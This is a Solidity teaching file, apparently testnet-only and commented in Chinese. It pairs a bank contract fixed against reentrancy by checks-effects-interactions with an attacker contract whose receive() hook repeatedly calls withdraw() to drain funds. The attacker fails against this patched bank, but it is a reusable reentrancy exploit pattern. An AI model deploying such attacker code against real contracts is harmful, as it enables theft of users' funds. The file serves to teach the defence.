// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title PatchedBank（修复版教学合约）
 * @notice EDUCATIONAL / TESTNET ONLY
 *
 * 与 GreenhouseVault 逻辑相同，但采用 Checks-Effects-Interactions：
 * 先更新状态，再发起外部调用，因此重入攻击会失败。
 */
contract PatchedBank {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    event Deposited(address indexed account, uint256 amount);
    event Withdrawn(address indexed account, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /// @dev 修复后：先清零余额，再外部调用（CEI）。
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // ✅ Effects first
        balances[msg.sender] = 0;
        totalDeposits -= amount;

        // ✅ Interactions last
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        emit Withdrawn(msg.sender, amount);
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancyAttackerPatched（同一攻击者 · TESTNET ONLY）
 */
contract ReentrancyAttackerPatched {
    PatchedBank public immutable bank;
    uint256 public attackCount;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address bankAddress) {
        bank = PatchedBank(payable(bankAddress));
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "need seed ether");
        bank.deposit{value: ATTACK_AMOUNT}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT && attackCount < 20) {
            attackCount += 1;
            bank.withdraw();
        }
    }

    function stolen() external view returns (uint256) {
        return address(this).balance;
    }
}
